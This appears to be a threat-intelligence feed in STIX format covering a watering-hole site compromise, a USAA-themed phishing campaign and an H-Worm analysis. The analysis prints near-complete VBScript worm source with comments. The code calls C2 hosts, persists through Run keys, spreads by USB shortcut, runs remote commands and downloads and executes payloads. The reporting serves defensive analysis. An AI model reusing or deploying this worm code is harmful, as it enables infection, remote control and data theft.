stix:STIX_Header.stix:Description: The website for Soros Economic Development Fund in New York, sedfny.org, was compromised in a watering hole campaign. The site redirected users to a malicious Flash file at IP 101.55.121.196 that exploits vulnerability CVE-2015-0313. The malware called back to rumail.urlns.us (59.188.247.23).

stix:Indicator.indicator:Description:
The website for Soros Economic Development Fund in New York, sedfny.org, was compromised in a watering hole campaign. According to the report, it is redirecting users to a malicious Flash file that exploits vulnerability CVE-2015-0313.
This redirect site contains a few lines of JavaScript to parse the user-agent of the user's browser to determine the user's operating system. The site hosts a malicious Adobe Flash file, among other malware, to exploit vulnerability CVE-2015-0313.

This was identified as the C2 site. It resolved to IP 59.188.247.23 at the time of the report.
IP 108.187.145.201 was also associated with this activity.

stix:STIX_Header.stix:Title: Financial Themed Phishing Emails Lead to Credential Harvesting Sites
stix:STIX_Header.stix:Description: On 27 April 2015, a U.S. Government Agency was targeted with phishing emails that included a PDF attachment which contains a malicious hyperlink. When the hyperlink is clicked, users are directed to a spoofed login page that is suspected to be for credential harvesting.

stix:Indicator.indicator:Description:
--- BEGIN EMAIL HEADER --- EHLO mail.morva.net MAIL FROM:<USAA.WEB.customer-security.alert@email.usaa.com> SIZE=112400 RCPT TO:[REDACTED] DATA Received: from [REDACTED] (helo=GASTRO-ECW.gastrorockland.local) by mail.morva.net with esmtpsa (TLSv1:AES256-SHA:256) (Exim 4.76) (envelope-from <USAA.WEB.customer-security.alert@email.usaa.com>) id 1Ykhgu-0005un-Tk; Wed, 22 Apr 2015 04:04:58 +0430 Content-Type: multipart/mixed; boundary="===============0351142356==" MIME-Version: 1.0 Subject: USAA Security Preference Update Statement To: Recipients <USAA.WEB.customer-security.alert@email.usaa.com> From: "USAA" <USAA.WEB.customer-security.alert@email.usaa.com> Date: Tue, 21 Apr 2015 19:35:54 -0400 X-Morva-MailScanner-ID: 1Ykhgu-0005un-Tk X-Spam-Status: No ---END EMAIL HEADER ---
--- The email body is blank ---
This Phishing campaign also used the subject line: USAA Secure Account Logon Update Reminder
The emails were sent from the following IP addresses: 79.132.192.4 117.102.100.179 157.56.111.79
The spoofed sender addresses include: WEB.Preference.update@usaa.com customer.security.USAA.protect@mail.com USAA.WEB.customer-security.alert@email.usaa.com
Attachments with these potential names were observed: USAA-logon-update-reminder-2015-04-20 (PROTECTED).pdf USAA-logon-update-reminder-2015-04-20 (PROTECTED) (2).pdf 2015-04-21_USAA_Account_Preference_Update (SECURE ) (1).pdf 2015-04-21_USAA_Account_Preference_Update (SECURE ) (3).pdf 20150416_USAA_Account_Preference_Update (SECURE).pdf
These attachments contained a malicious link to a spoofed login page to harvest credentials.
The phishing emails included a PDF attachment which contains a malicious hyperlink. When the hyperlink is clicked, users are directed to a spoofed login page for suspected credential harvesting.
The phishing emails included a PDF attachment which contains a malicious hyperlink. When the hyperlink is clicked, users are directed to a spoofed login page for suspected credential harvesting.

stix:STIX_Header.stix:Title: H-Worm RAT Analysis
stix:STIX_Header.stix:Description:
During the first half of 2014, two Visual Basic Script files were observed on a server. The files are variants of the H-Worm, a Visual Basic worm, with capabilities to propagate via the use of removable media. The first two files outlined included the two scripts. The third file (MD5: d763d864dfc657da7f80705c2f2babe3) is a decoded version of a variable from the file named ewethxqlug.vbs (MD5: 2fc337753a9a084d1a042af12972a1f0).
Indicators surrounding the H-Worm were previously reported in IB-14-10322.

stix:Indicator.indicator:Description:
Within the code, the variable "vNr8t86H3r8U3Oy4wy3q" contains base64 encoded data, and each substring is separated by the "^" delimiter.
The algorithm used splits the base64 encoded data into smaller strings and uses a loop to decode each substring. The decoded values of each string are concatenated into the variable "vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwVwPsx5uL08u07xq1s26O4". The decoded string is then sent to standard output.
Shown below is the content of the script. Analysis of the contents of the base64 encoded content can be found in the file with MD5: d763d864dfc657da7f80705c2f2babe3.
----- BEGIN CODE -----
vNr8t86H3r8U3Oy4wy3q="[large blob of base64 encoded data]" vNr8t86H3r8U3Oy4wy3q=SPLIT(vNr8t86H3r8U3Oy4wy3q,"^") FOR vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwV = 0 TO UBOUND(vNr8t86H3r8U3Oy4wy3q) -1 vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwVwPsx5uL08u07xq1s26O4 = vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwVwPsx5uL08u07xq1s26O4 & Base64Decode(vNr8t86H3r8U3Oy4wy3q(vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwV)) NEXT wscript.echo(vNr8t86H3r8U3Oy4wy3qG3MRRrxqQTTDI45xFDwVwPsx5uL08u07xq1s26O4)
Function Base64Encode(sText) Dim oXML, oNode Set oXML = CreateObject("Msxml2.DOMDocument.3.0") Set oNode = oXML.CreateElement("base64") oNode.dataType = "bin.base64" oNode.nodeTypedValue =Stream_StringToBinary(sText) Base64Encode = oNode.text Set oNode = Nothing Set oXML = Nothing End Function
Function Base64Decode(ByVal vCode) Dim oXML, oNode Set oXML = CreateObject("Msxml2.DOMDocument.3.0") Set oNode = oXML.CreateElement("base64") oNode.dataType = "bin.base64" oNode.text = vCode Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue) Set oNode = Nothing Set oXML = Nothing End Function
Function Stream_StringToBinary(Text) Const adTypeText = 2 Const adTypeBinary = 1 Dim BinaryStream Set BinaryStream = CreateObject("ADODB.Stream") BinaryStream.Type = adTypeText BinaryStream.CharSet = "us-ascii" BinaryStream.Open BinaryStream.WriteText Text BinaryStream.Position = 0 BinaryStream.Type = adTypeBinary BinaryStream.Position = 0 Stream_StringToBinary = BinaryStream.Read Set BinaryStream = Nothing End Function
Function Stream_BinaryToString(Binary) Const adTypeText = 2 Const adTypeBinary = 1 Dim BinaryStream Set BinaryStream = CreateObject("ADODB.Stream") BinaryStream.Type = adTypeBinary BinaryStream.Open BinaryStream.Write Binary BinaryStream.Position = 0 BinaryStream.Type = adTypeText BinaryStream.CharSet = "us-ascii" Stream_BinaryToString = BinaryStream.ReadText Set BinaryStream = Nothing End Function
----- END CODE -----

This file is a malicious Visual Basic script. This worm is capable of performing the following actions: - maintaining persistence on the system by installing autorun registry keys - installing a copy of itself on the removable media drive(s) found - communicating with the command and control (C2) server and performing actions based on the response from the C2
The worm is able to perform the following actions: a) receive updates from the C2 server b) uninstall itself c) download content from the C2 server
----- BEGIN CODE -----
'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-= host = "thescorpionkig.no-ip.org" port = "7777" installdir = "%temp%" Vname = "test" etat = "-" z = "winmgmts:{impersonationLevel=impersonate}!\\.\root\" Dim shellobj set shellobj = wscript.createobject("wscript.shell") dim filesystemobj set filesystemobj = createobject("scripting.filesystemobject") dim httpobj set httpobj = createobject("msxml2.xmlhttp")
'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-= installname = wscript.scriptname startup = shellobj.specialfolders ("startup") & "\" installdir = shellobj.expandenvironmentstrings(installdir) & "\" if not filesystemobj.folderexists(installdir) then installdir = shellobj.expandenvironmentstrings("%temp%") & "\" spliter = "<|>" sleep = 5000 dim response dim cmd dim param info = "" usbspreading = "" dim oneonce
'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-= on error resume next 'main function of the malware instance 'sub. 'Creates registry keys and copies malicious script to 2 additional 'destinations. 'See sub instance description below for more details. while true 'infinite loop install 'sub. 'Copies itself to any removable drive attached to the system, and creates 'short-cut to it. 'See sub install description below for more details. response = "" response = post ("is-ready","") 'function. 'Constructs the POST request by gathering information about the infected 'system and 'sends it back to the C2. cmd = split (response,spliter) 'parse the response received from the command and control center (C2). select case cmd (0) 'perform an action based on the remote server response. case "excecute" 'run command received from remote C2 on the victim's machine. param = cmd (1) execute param etat = "vbs run sexcu" case "update" 'update the script and run the newer version on the system. 'the script content is overwritten with the data received 'from remote server. param = cmd (1) oneonce.close set oneonce = filesystemobj.opentextfile (installdir & installname ,2, false) oneonce.write param oneonce.close shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34) wscript.quit case "uninstall" 'uninstall the script uninstall Case "send" 'downloads content from the remote server into a file. 'Saves this file on the infected machine and runs it. param = cmd (1) download (param) 'see download function description for more details. end select
wscript.sleep sleep
wend
sub install on error resume next dim lnkobj dim filename dim fileicon
upstart 'enumerate all Drive objects on the system for each drive in filesystemobj.drives if drive.isready = true then if drive.freespace > 0 then if drive.drivetype = 1 then lnkobj.iconlocation = fileicon 'finds removable drives that have free space. filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true 'copies malicious script onto the removable drive 'the path is: [drive_letter]:\[script_name].vbs if filesystemobj.fileexists (drive.path & "\" & installname) then filesystemobj.getfile(drive.path & "\" & installname).attributes = 2+4 'changes file attributes to hidden and system. end if for each file in filesystemobj.getfolder( drive.path & "\" ).files 'enumerates every file in the [drive_letter]:\ root. if instr (file.name,".") then if lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then 'looks for the files with any extension other then "lnk". file.attributes = 2+4 'changes file attributes to hidden and system. if ucase (file.name) <> ucase (installname) then filename = split(file.name,".") set lnkobj = shellobj.createshortcut (drive.path & "\" & filename (0) & ".lnk") 'creates link (short-cut) lnkobj.targetpath = "cmd.exe" lnkobj.workingdirectory = "" 'default. lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit" 'the short-cut executes the following command 'every time it started 'cmd.exe /c start "[script_name]"& 'start"[enumerate_file]&exit. fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, "."))) & "\") & "\defaulticon\") if instr (fileicon,",") = 0 then lnkobj.iconlocation = file.path else lnkobj.iconlocation = fileicon end if lnkobj.save() 'saves link etat = "Spriting" End if end if end if next end If end If end if next err.clear end sub 'end of sub install
sub uninstall on error resume next dim filename
shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0) shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0) filesystemobj.deletefile startup & installname ,true filesystemobj.deletefile wscript.scriptfullname ,true
for each drive in filesystemobj.drives if drive.isready = true then if drive.freespace > 0 then if drive.drivetype = 1 then for each file in filesystemobj.getfolder ( drive.path & "\").files on error resume next if instr (file.name,".") then if lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then file.attributes = 0 if ucase (file.name) <> ucase (installname) then filename = split(file.name,".") filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" ) else filesystemobj.deletefile (drive.path & "\" & file.name) end if end if end if next end if end if end if next wscript.quit end sub
function post (cmd ,param) post = param httpobj.open "post","http[:]//" & host & ":" & port &"/" & cmd, false httpobj.setrequestheader "user-agent:",information 'User-Agent string. "user-agent httpobj.send param 'send POST request to the C2 post = httpobj.responsetext 'return the response from the C2. end function
Function information on error resume Next if inf = "" then If gtv("Name") = "??" Then inf = Vname & "_" & hwid & spliter 'inf = "test" + [volume_serial_number + "<|>" Else inf = gtv("Name") & "-" & hwid & spliter ' inf = [value of registry key "HKCU\Software\scorpion\Name"] + [volume_serial_number + "<|>" End If
inf = inf & shellobj.expandenvironmentstrings("%computername%") & spliter 'inf = "test"/[value of registry key '"HKCU\Software\scorpion\Name"] '+ [volume_serial_number + "<|>" ' + [computer_name] + "<|>" inf = inf & shellobj.expandenvironmentstrings("%username%") & spliter 'inf = "test"/[value of registry key '"HKCU\Software\scorpion\Name"] '+ [volume_serial_number + "<|>" '+ [computer_name] + "<|>" + [user_name] + "<|>" set root = getobject("winmgmts:{impersonationlevel=impersonate} !\\.\root\cimv2") set os = root.execquery ("select * from win32_operatingsystem") for each osinfo in os inf = inf & osinfo.caption & spliter 'inf = "test"/[value of registry key '"HKCU\Software\scorpion\Name"] '+ [volume_serial_number + "<|>" '+ [computer_name] + "<|>" + [user_name] + "<|>" '+ [OS_name] + "<|>" exit for next inf = inf & "underworld final" & spliter 'inf = "test"/[value of registry key '"HKCU\Software\scorpion\Name"] '+ [volume_serial_number + "<|>" '+ [computer_name] + "<|>" + [user_name] + "<|>" '+ [OS_name] + "<|>" + "underworld final" + "<|>" inf = inf & security & spliter 'inf = "test"/[value of registry key '"HKCU\Software\scorpion\Name"] '+ [volume_serial_number + "<|>" '+ [computer_name] + "<|>" + [user_name] + "<|>" '+ [OS_name] + "<|>" + "underworld final" + "<|>" '+ [list_of_AV_products_installed_on_the_system_ 'separated_by_comma or "nan-av"] + "<|>" + inf = inf & usbspreading & spliter 'inf = "test"/[value of registry key '"HKCU\Software\scorpion\Name"] '+ [volume_serial_number + "<|>" '+ [computer_name] + "<|>" + [user_name] + "<|>" '+ [OS_name] + "<|>" + "underworld final" + "<|>" '+ [list_of_AV_products_installed_on_the_system_ 'separated_by_comma or "nan-av"] + "<|>" + '+ ["true"/"false"] + "<|>" + inf = inf & gtv("Date") & spliter 'inf = "test"/[value of registry key '"HKCU\Software\scorpion\Name"] '+ [volume_serial_number + "<|>" '+ [computer_name] + "<|>" + [user_name] + "<|>" '+ [OS_name] + "<|>" + "underworld final" + "<|>" '+ [list_of_AV_products_installed_on_the_system_ 'separated_by_comma or "nan-av"] + "<|>" + '+ ["true"/"false"] + "<|>" + '+ [value_of_the_"HKCU\Software\scorpion\Date"_registry_key] + "<|>" inf = inf & nf & spliter 'inf = "test"/[value of registry key '"HKCU\Software\scorpion\Name"] '+ [volume_serial_number + "<|>" '+ [computer_name] + "<|>" + [user_name] + "<|>" '+ [OS_name] + "<|>" + "underworld final" + "<|>" + ' + [list_of_AV_products_installed_on_the_system_ 'separated_by_comma or "nan-av"] + "<|>" + '+ ["true"/"false"] + "<|>" + '+ [value_of_the_"HKCU\Software\scorpion\Date" '_registry_key] + "<|>" '+ [string_containing_values_enumerated_from_the_ '"HKLM\SOFTWARE\Microsoft\.NETFramework\Policy"_ 'registry-key/"-"] inf = inf & etat 'inf = "test"/[value of registry key '"HKCU\Software\scorpion\Name"] '+ [volume_serial_number + "<|>" '+ [computer_name] + "<|>" + [user_name] + "<|>" '+ [OS_name] + "<|>" + "underworld final" + "<|>" '+ [list_of_AV_products_installed_on_the_system_ 'separated_by_comma or "nan-av"] + "<|>" + '+ ["true"/"false"] + "<|>" '+ [value_of_the_"HKCU\Software\scorpion\Date" '_registry_key] + "<|>" '+ [string_containing_values_enumerated_from_the_ '"HKLM\SOFTWARE\Microsoft\.NETFramework\Policy" '_registry-key/"-"] '+ "-"/"Spriting" information = inf else information = inf end if end function
sub upstart () on error resume Next
'creates auto-run registry keys. shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0), "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ" '"HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\ '[script_name].vbs"="\"wscript.exe /B %temp%\[script_name].vbs\"" shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\ currentversion\run\" & split (installname,".")(0), "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ" 'HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\ '[script_name].vbs"="\"wscript.exe /B %temp%\[script_name].vbs\""
'copies malicious script to two (2) locations on the system. filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true '%temp%\[script_name].vbs filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true '%startup%\[script_name].vbs
end sub
function hwid 'gets the volume's serial number. on error resume next
set root = getobject("winmgmts:{impersonationlevel=impersonate}! \\.\root\cimv2") set disks = root.execquery ("select * from win32_logicaldisk") for each disk in disks if disk.volumeserialnumber <> "" then hwid = disk.volumeserialnumber exit for end if next end function 'end hwnd
function security 'determines all the AV product installed on the system. 'If none were found returns "nan-av". on error resume next
security = ""
set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2") set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48) for each objitem in colitems versionstr = split (objitem.version,".") next versionstr = split (colitems.version,".") osversion = versionstr (0) & "." for x = 1 to ubound (versionstr) osversion = osversion & versionstr (i) next osversion = eval (osversion) if osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"
set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc) Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)
for each objantivirus in colantivirus security = security & objantivirus.displayname & " ." next if security = "" then security = "nan-av" end function
function instance on error resume next If gtv("date") = "??" Then 'Creates registry sub-key "HKCU\Software\scorpion\date" if it 'doesn't exist. stv "date" , date End If If gtv("Name") = "??" Then 'Create registry sub-key "HKCU\Software\scorpion\Name" if it 'doesn't exist. stv "Name" , Vname End If If gtv("new") = "??" Then ;Create registry sub-key "HKCU\Software\scorpion\new" if it 'doesn't exist. stv "new" , "no" End If
usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\") 'Reads data from the registry 'HKEY_LOCAL_MACHINE\software\[script_name]\" if usbspreading = "" then 'skips whole if statement if "usbspreading" not an empty string if lcase ( mid(wscript.scriptfullname,2)) = ":\" & lcase(installname) then usbspreading = "true" shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\", usbspreading, "REG_SZ" 'sets the value of the registry sub-key HKEY_LOCAL_MACHINE\software\ '[script_name]" equal to "true" 'this is set to true if the path is of the following form: '[driver_letter]:\... else usbspreading = "false" shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\", usbspreading, "REG_SZ" 'sets the value of the registry sub-key HKEY_LOCAL_MACHINE\software\ '[script_name]" equal to "false" end if end If
upstart set scriptfullnameshort = filesystemobj.getfile (wscript.scriptfullname) set installfullnameshort = filesystemobj.getfile (installdir & installname) If lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34) wscript.quit End If Err.clear Set oneonce = filesystemobj.opentextfile (installdir & installname ,8,false) 'checks if the script is able to open the file for reading, 'if not the script exits. If err.number > 0 then wscript.quit
End function 'end of instance
Function download (fileurl) strsaveto = installdir & mid (fileurl, instrrev (fileurl,"\") + 1) 'contains the path to the content to be downloaded from 'the remote server. set objhttpdownload = createobject("msxml2.xmlhttp") objhttpdownload.open "post","http[:]//" & host & ":" & port &"/" & "is-sending" & spliter & fileurl, false 'creates POST request that downloads the malicious content. objhttpdownload.send "" 'sends POST request to the remote system.
set objfsodownload = createobject ("scripting.filesystemobject") if objfsodownload.fileexists (strsaveto) then 'Deletes the file on the local system if it already exist. objfsodownload.deletefile (strsaveto) end if if objhttpdownload.status = 200 then 'downloads malicious content from remote server only 'if server replied with HTTP 200 OK code. dim objstreamdownload set objstreamdownload = createobject("adodb.stream") with objstreamdownload .type = 1 .open .write objhttpdownload.responsebody 'gets just the response body. .savetofile strsaveto 'saves downloaded content directly into the file on 'the local system. .close end with set objstreamdownload = nothing end if if objfsodownload.fileexists (strsaveto) then 'runs the file . shellobj.run strsaveto etat = "Run File donnee" end if end Function 'end of function download
Function nf 'enumerates registry "HKLM\SOFTWARE\Microsoft\.NETFramework\Policy" 'Any of the sub-keys that contains "v" are concatenated into large 'string where entries separated by 'the space (0x20). The resulting string is returned. 'If no entries found the function returns "-". On Error Resume next Set oReg = GetObject(z & "default:StdRegProv") Dim aSub, sKey , v oReg.EnumKey &H80000002,"SOFTWARE\Microsoft\.NETFramework\Policy", aSub For Each sKey In aSub If InStr(sKey,"v") > 0 Then v = v & " " & sKey End if Next nf = nf & v If nf = "" Then nf = "-" End If End Function 'end of function nf.
Function stv(nm ,vl) On Error Resume Next shellobj.RegWrite "HKCU\Software\scorpion\" & nm ,vl, "REG_SZ" end Function
Function gtv(nm) On Error Resume Next gtv = shellobj.RegRead ("HKCU\Software\scorpion\" & nm) If gtv = "" Then gtv = "??" End If End Function ----- END CODE -----

This file is the decoded content of the base64 encoded blob of data from the file named ewethxqlug.vbs (MD5: 2fc337753a9a084d1a042af12972a1f0).
The malicious script has the capability to extend the functionality of the code used in the file named 13dfSS.vbs (MD5: 694946ddda75f82c90ca2c2ba80157e4). The worm is capable of performing the following actions:
- maintaining persistence on the system by installing autorun registry keys - installing a copy of itself on the removable media drive(s) found - communicating with the command and control (C2) server and performing actions based on the response from the C2.
Additionally, the worm can: a) receive updates from the C2 server b) uninstall itself c) download content from the C2 server d) download and execute files obtained from other remote systems e) upload a specified file to the C2 f) enumerate drivers installed on the infected system, and send the list back to the C2 g) enumerate all files and folders on the infected system and send gathered information back to the C2 h) enumerate all the running processes on the infected system and send the result to the C2 i) execute a command sent from the C2 server on the command line and send the result back to the C2 server j) delete files and directories k) kill running processes l) sleep for a specified amount of time
----- BEGIN CODE -----
'<[ recoder : houdini (c) skype : houdini-fx ]>
'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
host = "yahoo18.no-ip.org" port = 83 installdir = "%temp%" lnkfile = true lnkfolder = true
'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=
dim shellobj set shellobj = wscript.createobject("wscript.shell") dim filesystemobj set filesystemobj = createobject("scripting.filesystemobject") dim httpobj set httpobj = createobject("msxml2.xmlhttp")
'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=
installname = wscript.scriptname startup = shellobj.specialfolders ("startup") & "\" installdir = shellobj.expandenvironmentstrings(installdir) & "\" if not filesystemobj.folderexists(installdir) then installdir = shellobj.expandenvironmentstrings("%temp%") & "\" spliter = "<" & "|" & ">" sleep = 5000 dim response dim cmd dim param info = "" usbspreading = "" startdate = "" dim oneonce
'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-= on error resume next
instance 'sub. Creates registry keys and copies malicious script to 2 'additional destinations. 'See sub instance description for file-2. while true
install 'sub. Copies itself to any removable drive attached to the 'system, and creates short-cut to it. 'See sub install description for file-2. response = "" response = post ("is-ready","") cmd = split (response,spliter) select case cmd (0) case "excecute" param = cmd (1) execute param case "update" param = cmd (1) oneonce.close set oneonce = filesystemobj.opentextfile (installdir & installname , 2, false) oneonce.write param oneonce.close shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & chr(34) wscript.quit case "uninstall" uninstall case "send" download cmd (1),cmd (2) case "site-send" 'download file from the remote server (server and file names are provided 'by C2) and execute it on the victim's system. sitedownloader cmd (1),cmd (2) case "recv" 'uploads the content of the specified file to the remote server param = cmd (1) upload (param) case "enum-driver" 'sends information about all the drivers, enumerated on the infected 'system, to the remote server in the following format '[path_to_the_driver]|[driver_type] + "<|>" post "is-enum-driver",enumdriver case "enum-faf" 'enumerates all files and folders on the infected systems. 'the following data is sent to the remote server: 'if item is directory: [path]||d|[directory_attributes] + "<|>" 'if item is file: [path]|[file_size]|f|[file_attributes] + "<|>" param = cmd (1) post "is-enum-faf",enumfaf (param) case "enum-process" 'enumerates all the processes on the victim's system. 'the following information about the process is sent 'to the remote server: '[process_name]|[pid]|[process_path] + "<|>" post "is-enum-process",enumprocess case "cmd-shell" '"cmdshell" function executes a command from the command line 'and returns the output if any produced by the command. '"post" sends the returned result of "cmdshell" command to 'the remote server. param = cmd (1) post "is-cmd-shell",cmdshell (param) case "delete" 'deletes specified file and the folder containing it. param = cmd (1) deletefaf (param) case "exit-process" 'kills process with the following command '"taskkill /F /T /PID [pid]" param = cmd (1) exitprocess (param) case "sleep" 'sleeps for the specified amount of time. param = cmd (1) sleep = eval (param) end select
wscript.sleep sleep
wend
sub install on error resume next dim lnkobj dim filename dim foldername dim fileicon dim foldericon
upstart for each drive in filesystemobj.drives
if drive.isready = true then if drive.freespace > 0 then if drive.drivetype = 1 then filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true if filesystemobj.fileexists (drive.path & "\" & installname) then filesystemobj.getfile(drive.path & "\" & installname).attributes = 2+4 end if for each file in filesystemobj.getfolder( drive.path & "\" ).Files if not lnkfile then exit for if instr (file.name,".") then if lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then file.attributes = 2+4 if ucase (file.name) <> ucase (installname) then filename = split(file.name,".") set lnkobj = shellobj.createshortcut (drive.path & "\" & filename (0) & ".lnk") lnkobj.windowstyle = 7 lnkobj.targetpath = "cmd.exe" lnkobj.workingdirectory = "" lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) & "&exit" fileicon = shellobj.regread ( "HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ( "HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")( ubound(split(file.name, ".")))& "\") & "\defaulticon\") if instr (fileicon,",") = 0 then lnkobj.iconlocation = file.path else lnkobj.iconlocation = fileicon end if lnkobj.save() end if end if end if next for each folder in filesystemobj.getfolder( drive.path & "\" ) .subfolders if not lnkfolder then exit for folder.attributes = 2+4 foldername = folder.name set lnkobj = shellobj.createshortcut (drive.path & "\" & foldername & ".lnk") lnkobj.windowstyle = 7 lnkobj.targetpath = "cmd.exe" lnkobj.workingdirectory = "" lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit" foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\ folder\defaulticon\") if instr (foldericon,",") = 0 then lnkobj.iconlocation = folder.path else lnkobj.iconlocation = foldericon end if lnkobj.save() next end If end If end if next err.clear end sub
sub uninstall on error resume next dim filename dim foldername
shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0) shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0) filesystemobj.deletefile startup & installname ,true filesystemobj.deletefile wscript.scriptfullname ,true
for each drive in filesystemobj.drives if drive.isready = true then if drive.freespace > 0 then if drive.drivetype = 1 then for each file in filesystemobj.getfolder ( drive.path & "\").files on error resume next if instr (file.name,".") then if lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then file.attributes = 0 if ucase (file.name) <> ucase (installname) then filename = split(file.name,".") filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" ) else filesystemobj.deletefile (drive.path & "\" & file.name) end If else filesystemobj.deletefile (file.path) end if end if next for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders folder.attributes = 0 next end if end if end if next wscript.quit end sub
function post (cmd ,param)
post = param httpobj.open "post","http[:]//" & host & ":" & port &"/" & cmd, false httpobj.setrequestheader "user-agent:",information httpobj.send param post = httpobj.responsetext end function
function information on error resume next if inf = "" then inf = hwid & spliter inf = inf & shellobj.expandenvironmentstrings("%computername%") & spliter inf = inf & shellobj.expandenvironmentstrings("%username%") & spliter set root = getobject("winmgmts:{impersonationlevel=impersonate}! \\.\root\cimv2") set os = root.execquery ("select * from win32_operatingsystem") for each osinfo in os inf = inf & osinfo.caption & spliter exit for next inf = inf & "plus" & spliter inf = inf & security & spliter inf = inf & usbspreading information = inf else information = inf end if end function

end sub
function hwid on error resume next
set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2") set disks = root.execquery ("select * from win32_logicaldisk") for each disk in disks if disk.volumeserialnumber <> "" then hwid = disk.volumeserialnumber exit for end if next end function
function security on error resume next
security = ""
set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2") set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48) for each objitem in colitems versionstr = split (objitem.version,".") next versionstr = split (colitems.version,".") osversion = versionstr (0) & "." for x = 1 to ubound (versionstr) osversion = osversion & versionstr (i) next osversion = eval (osversion) if osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"
set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc) Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)
for each objantivirus in colantivirus security = security & objantivirus.displayname & " ." next if security = "" then security = "nan-av" end function
function instance on error resume next
usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\") if usbspreading = "" then if lcase ( mid(wscript.scriptfullname,2)) = ":\" & lcase(installname) then usbspreading = "true - " & date shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\", usbspreading, "REG_SZ" else usbspreading = "false - " & date shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\", usbspreading, "REG_SZ"
end if end If
upstart set scriptfullnameshort = filesystemobj.getfile (wscript.scriptfullname) set installfullnameshort = filesystemobj.getfile (installdir & installname) if lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34) wscript.quit end If err.clear set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false) if err.number > 0 then wscript.quit end function
sub sitedownloader (fileurl,filename)
strlink = fileurl strsaveto = installdir & filename set objhttpdownload = createobject("msxml2.xmlhttp" ) objhttpdownload.open "get", strlink, false objhttpdownload.send
set objfsodownload = createobject ("scripting.filesystemobject") if objfsodownload.fileexists (strsaveto) then objfsodownload.deletefile (strsaveto) end if
